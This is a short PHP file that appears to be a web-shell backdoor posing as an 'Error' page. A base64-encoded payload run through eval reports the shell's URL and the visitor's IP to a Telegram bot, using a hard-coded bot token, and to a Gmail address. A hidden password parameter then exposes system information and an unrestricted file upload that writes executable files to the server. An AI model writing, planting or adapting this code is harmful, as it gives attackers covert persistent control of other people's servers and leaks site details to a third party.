<?php
error_reporting(0);
set_time_limit(0);
eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsNCiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJHBlc2FuX2FsZXJ0ID0gIk7DqlcgU0jDqjExICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQokdG9rZW4gPSAiNTI2ODQwMTk5MzpBQUVFZjlTRnpqYjFxTFY0X1V1X2tDTTdNbkVCekJtNkx0byI7DQokY2hhdF9pZCA9ICIxODk2NDY0Mjk1IjsNCiRkYXRhID0gWw0KICAgICd0ZXh0JyA9PiAkcGVzYW5fYWxlcnQsDQogICAgJ2NoYXRfaWQnID0+ICRjaGF0X2lkLA0KXTsNCmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSApOw0KbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUgQm9TUyIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));
echo '<title>Error</title>';
if($_GET['xalik']=="kalix"){
echo "<center><b>Uname:".php_uname()."<br></b>"; 
echo '<font color="black" size="4">';
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';
    $mode = '0755';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
echo" <a href=$userfile_name><center><b>Sucess Upload :D ==> $userfile_name</b></center></a>";
}
}
else{
echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';

}
?>
